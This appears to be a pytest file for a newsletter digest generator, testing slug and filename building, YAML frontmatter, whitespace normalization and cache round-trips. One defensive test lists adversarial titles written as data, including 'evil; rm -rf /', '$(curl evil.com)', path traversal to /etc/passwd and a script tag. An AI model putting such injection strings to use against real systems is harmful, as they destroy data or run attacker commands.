"""Tests for digest_generator/core/digest/io.py: slugify, filename plus markdown builders, stage cache."""


import pytest

from digest_generator.core.digest.io import (
    build_digest_filename,
    build_digest_markdown,
    build_digest_slug,
    load_json_stage,
    load_section_drafts,
    save_json_stage,
    save_section_drafts,
    slugify_title,
)
from digest_generator.core.digest.types import (
    DigestFraming,
    DigestResult,
    SectionDraft,
    WatchItem,
)


class TestSlugifyTitle:
    """Title -> URL/filename-safe slug. Co-located here because digest filenames are the only consumer."""

    def test_basic_title(self):
        assert slugify_title("AI Agents Reshape Workflows") == "ai-agents-reshape-workflows"

    def test_special_characters(self):
        assert slugify_title("What's New: AI & ML!") == "whats-new-ai-ml"

    def test_collapses_multiple_hyphens(self):
        assert slugify_title("AI --- ML") == "ai-ml"

    def test_strips_leading_trailing_hyphens(self):
        assert slugify_title("--hello--") == "hello"

    def test_truncates_at_word_boundary(self):
        long_title = "This Is A Very Long Title That Exceeds The Maximum Length Allowed For Slugs In Filenames"
        slug = slugify_title(long_title, max_length=30)
        assert len(slug) <= 30
        assert not slug.endswith("-")

    def test_empty_string(self):
        assert slugify_title("") == ""

    def test_unicode_stripped(self):
        assert slugify_title("AI Café Résumé") == "ai-caf-rsum"


class TestBuildDigestFilename:
    """Digest filename: `{date}.md`, stable and decoupled from the title."""

    def test_uses_date(self):
        result = DigestResult(
            title="AI Agents Reshape Workflows",
            content="body",
            date="2026-03-17",
            word_count=100,
            reading_time_minutes=1,
            article_count=10,
        )
        assert build_digest_filename(result) == "2026-03-17.md"

    def test_independent_of_title(self):
        # Same date -> same filename regardless of the digest title, so
        # regenerating in place overwrites one file instead of spawning a
        # second `.md` that would make `find_digest_md` ambiguous. Matches
        # the slug + opus stem so every published artifact shares one name.
        base = {
            "content": "body",
            "date": "2026-03-17",
            "word_count": 100,
            "reading_time_minutes": 1,
            "article_count": 10,
        }
        first = build_digest_filename(DigestResult(title="Original", **base))
        second = build_digest_filename(DigestResult(title="Very Different", **base))
        assert first == second == "2026-03-17.md"


class TestBuildDigestSlug:
    """URL slug: the issue date, deliberately title-independent."""

    def test_slug_is_the_date(self):
        result = DigestResult(
            title="AI Agents Reshape Workflows",
            content="body",
            date="2026-03-17",
            word_count=100,
            reading_time_minutes=1,
            article_count=10,
        )
        assert build_digest_slug(result) == "2026-03-17"

    def test_slug_independent_of_title(self):
        # Different titles, same date -> same slug, so editing the title
        # never moves the published URL.
        base = {
            "content": "body",
            "date": "2026-03-17",
            "word_count": 100,
            "reading_time_minutes": 1,
            "article_count": 10,
        }
        first = build_digest_slug(DigestResult(title="Original Title", **base))
        second = build_digest_slug(DigestResult(title="A Completely Different Title", **base))
        assert first == second == "2026-03-17"


class TestSubprocessSafety:
    """Defense-in-depth: no title-derived string reaches a filename, URL, or argv.

    Both the on-disk filename and the URL slug are the issue date —
    independent of the user-influenced title — so the argv/path/URL attack
    surface that a title-derived identifier would create is eliminated at
    the source. This pins that an adversarial title cannot pollute the slug.
    """

    @pytest.mark.parametrize(
        "adversarial_title",
        [
            "-rf /tmp/owned",
            "--output /tmp/owned",
            "../../etc/passwd",
            "..\\..\\Windows\\System32",
            "evil; rm -rf /",
            "$(curl evil.com)",
            "`whoami`",
            "<script>alert(1)</script>",
            "",
            "   ",
            "-" * 100,
            "-leading-dash",
            "trailing-dash-",
        ],
    )
    def test_adversarial_title_cannot_pollute_slug(self, adversarial_title):
        result = DigestResult(
            title=adversarial_title,
            content="body",
            date="2026-05-14",
            word_count=100,
            reading_time_minutes=1,
            article_count=10,
        )
        # The slug is the date verbatim, regardless of the title.
        assert build_digest_slug(result) == "2026-05-14"


class TestBuildDigestMarkdown:
    """YAML frontmatter generation: title/date/reading_time/article_count/summary/sections."""

    def test_includes_frontmatter(self):
        result = DigestResult(
            title="AI Agents",
            content="# Body\n\nText.",
            date="2026-03-17",
            word_count=200,
            reading_time_minutes=1,
            article_count=42,
            section_counts={"AI & Machine Learning": 20, "Security": 22},
        )
        md = build_digest_markdown(result)
        assert md.startswith("---\n")
        assert 'title: "AI Agents"' in md
        assert 'slug: "2026-03-17"' in md  # quoted: unquoted YAML would parse as a Date
        assert "date: 2026-03-17" in md
        assert "reading_time: 1 min" in md
        assert "article_count: 42" in md
        assert '"AI & Machine Learning": 20' in md
        assert "# Body" in md

    def test_escapes_title_with_quotes(self):
        result = DigestResult(
            title='He said "hello"',
            content="body",
            date="2026-03-17",
            word_count=10,
            reading_time_minutes=1,
            article_count=1,
        )
        md = build_digest_markdown(result)
        assert r'title: "He said \"hello\""' in md

    def test_content_follows_frontmatter(self):
        result = DigestResult(
            title="Title",
            content="Content here.",
            date="2026-03-17",
            word_count=2,
            reading_time_minutes=1,
            article_count=1,
        )
        md = build_digest_markdown(result)
        parts = md.split("---\n")
        # parts[0] is empty (before first ---), parts[1] is frontmatter, rest is content
        assert "Content here." in parts[2]

    def test_includes_summary_from_content(self):
        """First non-heading paragraph should be extracted as summary."""
        result = DigestResult(
            title="Title",
            content="# Heading\n\nThis is the executive summary paragraph.\n\n## Section",
            date="2026-03-17",
            word_count=10,
            reading_time_minutes=1,
            article_count=5,
        )
        md = build_digest_markdown(result)
        assert 'summary: "This is the executive summary paragraph."' in md

    def test_truncates_long_summary(self):
        """Summary with no sentence terminators should ellipsis-truncate at word boundary."""
        long_paragraph = "This is a very important " * 10  # ~250 chars, no periods
        result = DigestResult(
            title="Title",
            content=f"# Heading\n\n{long_paragraph}\n\n## Section",
            date="2026-03-17",
            word_count=50,
            reading_time_minutes=1,
            article_count=5,
        )
        md = build_digest_markdown(result)
        for line in md.split("\n"):
            if line.startswith("summary:"):
                summary_value = line.split('"')[1]
                assert len(summary_value) <= 158  # 155 + "..."
                assert summary_value.endswith("...")
                break
        else:
            pytest.fail("No summary line found in frontmatter")

    def test_summary_cuts_at_sentence_boundary(self):
        """Multi-sentence lede: summary ends on a real sentence terminator, no ellipsis."""
        lede = (
            "Anthropic's Claude Mythos Preview can now autonomously weaponize zero-day "
            "vulnerabilities, contributing to a drop in the average exploit lifecycle "
            "from five months to ten hours. Simultaneously, autonomous agents are "
            "deleting production databases. Governance frameworks are emerging."
        )
        result = DigestResult(
            title="Title",
            content=f"# Heading\n\n{lede}\n\n## Section",
            date="2026-05-03",
            word_count=80,
            reading_time_minutes=1,
            article_count=10,
        )
        md = build_digest_markdown(result)
        summary_value = next(
            line.split('"')[1] for line in md.split("\n") if line.startswith("summary:")
        )
        # First sentence alone is ~190 chars and ends with "ten hours.", which is the
        # natural boundary. Second sentence would push over the soft cap.
        assert summary_value.endswith("ten hours.")
        assert "..." not in summary_value
        assert "Simultaneously" not in summary_value

    def test_summary_packs_multiple_short_sentences(self):
        """Several short sentences that together fit under the soft cap come through whole."""
        lede = "First sentence is short. Second is also short. Third closes the lede."
        result = DigestResult(
            title="Title",
            content=f"# Heading\n\n{lede}\n\n## Section",
            date="2026-05-03",
            word_count=20,
            reading_time_minutes=1,
            article_count=3,
        )
        md = build_digest_markdown(result)
        summary_value = next(
            line.split('"')[1] for line in md.split("\n") if line.startswith("summary:")
        )
        assert summary_value == lede
        assert "..." not in summary_value

    def test_summary_falls_back_when_first_sentence_exceeds_soft_cap(self):
        """A single 250-char sentence: no boundary fits, so ellipsis fallback at hard cap."""
        long_sentence = "X " * 130 + "Y."  # ~262 chars, ends with period
        result = DigestResult(
            title="Title",
            content=f"# Heading\n\n{long_sentence}\n\n## Section",
            date="2026-05-03",
            word_count=130,
            reading_time_minutes=1,
            article_count=1,
        )
        md = build_digest_markdown(result)
        summary_value = next(
            line.split('"')[1] for line in md.split("\n") if line.startswith("summary:")
        )
        assert summary_value.endswith("...")
        assert len(summary_value) <= 158

    def test_frontmatter_field_order(self):
        """Fields read top-down like docs/usage.md: title, slug, then summary before sections."""
        result = DigestResult(
            title="Title",
            content="# H\n\nLede paragraph.\n\n## AI",
            date="2026-03-17",
            word_count=20,
            reading_time_minutes=1,
            article_count=12,
            section_counts={"AI": 7, "Security": 5},
        )
        md = build_digest_markdown(result)
        title_idx = md.index("title:")
        slug_idx = md.index("slug:")
        summary_idx = md.index("summary:")
        sections_idx = md.index("sections:")
        assert title_idx < slug_idx < summary_idx < sections_idx


class TestInvisibleWhitespaceNormalization:
    """build_digest_markdown normalizes invisible Unicode whitespace to ASCII.

    LLMs sometimes emit U+00A0 (nbsp), U+2009 (thin space), or U+202F
    (narrow no-break space) as thousand or unit separators. Real example:
    a 2026-05-10 digest had 73 instances of U+202F between numbers and
    unit labels (``10,000<U+202F>RPS``, ``Layer<U+202F>7``), discovered
    only after the Edit tool failed to match the surrounding prose.
    Normalizing at write time defends every downstream consumer at once.
    """

    def test_narrow_no_break_space_normalized(self):
        result = DigestResult(
            title="Title",
            content="# H\n\nLede.\n\nThroughput hit 10,000\u202fRPS today.",
            date="2026-05-14",
            word_count=10,
            reading_time_minutes=1,
            article_count=1,
        )
        md = build_digest_markdown(result)
        assert "\u202f" not in md
        assert "10,000 RPS" in md

    def test_nbsp_normalized(self):
        result = DigestResult(
            title="Title with\u00a0nbsp",
            content="# H\n\nBody.",
            date="2026-05-14",
            word_count=2,
            reading_time_minutes=1,
            article_count=1,
        )
        md = build_digest_markdown(result)
        assert "\u00a0" not in md
        assert 'title: "Title with nbsp"' in md

    def test_thin_space_normalized(self):
        result = DigestResult(
            title="Title",
            content="# H\n\nLede.\n\nCapacity is 800\u2009MW.",
            date="2026-05-14",
            word_count=4,
            reading_time_minutes=1,
            article_count=1,
        )
        md = build_digest_markdown(result)
        assert "\u2009" not in md
        assert "800 MW" in md

    def test_no_invisible_ws_left_untouched(self):
        """ASCII-only input passes through unchanged (no spurious whitespace edits)."""
        result = DigestResult(
            title="Plain ASCII Title",
            content="# H\n\nBody paragraph.\n\n## Section\n\nContent.",
            date="2026-05-14",
            word_count=10,
            reading_time_minutes=1,
            article_count=1,
        )
        md = build_digest_markdown(result)
        assert "Plain ASCII Title" in md
        assert "Body paragraph." in md
        assert "Content." in md


class TestSaveLoadSectionDrafts:
    """Round-trip per-section .md cache (HTML-comment metadata prefix `<!-- articles: N -->`)."""

    def test_round_trip(self, tmp_path):
        drafts = [
            SectionDraft(
                name="AI & Machine Learning",
                content="## AI & Machine Learning\n\nOpenAI shipped GPT-6.\n",
                article_count=42,
            ),
            SectionDraft(
                name="Security",
                content="## Security\n\nA supply chain attack hit npm.\n",
                article_count=7,
            ),
        ]
        save_section_drafts(drafts, tmp_path / "sections")

        loaded = load_section_drafts(tmp_path / "sections")
        loaded_by_name = {d.name: d for d in loaded}
        assert set(loaded_by_name) == {"AI & Machine Learning", "Security"}
        assert loaded_by_name["AI & Machine Learning"].article_count == 42
        assert "OpenAI shipped GPT-6" in loaded_by_name["AI & Machine Learning"].content

    def test_missing_directory_returns_empty(self, tmp_path):
        assert load_section_drafts(tmp_path / "nope") == []

    def test_file_without_header_is_skipped(self, tmp_path):
        target = tmp_path / "sections"
        target.mkdir()
        (target / "ai.md").write_text("## AI\n\nNo header.\n", encoding="utf-8")
        assert load_section_drafts(target) == []


class TestSaveLoadJsonStage:
    """Round-trip JSON-persisted stages (framing.json + watch.json)."""

    def test_dataclass_round_trip(self, tmp_path):
        framing = DigestFraming(title="Agents Arrive", intro="OpenAI launched...")
        path = tmp_path / "framing.json"
        save_json_stage(framing, path)

        loaded = load_json_stage(path, DigestFraming)
        assert loaded == framing

    def test_list_round_trip(self, tmp_path):
        items = [
            WatchItem(heading="Reliability", body="Watch benchmarks."),
            WatchItem(heading="Regulation", body="Watch the EU AI Act."),
        ]
        path = tmp_path / "watch.json"
        save_json_stage(items, path)

        loaded = load_json_stage(path, WatchItem)
        assert loaded == items

    def test_missing_file_returns_none(self, tmp_path):
        assert load_json_stage(tmp_path / "nope.json", DigestFraming) is None
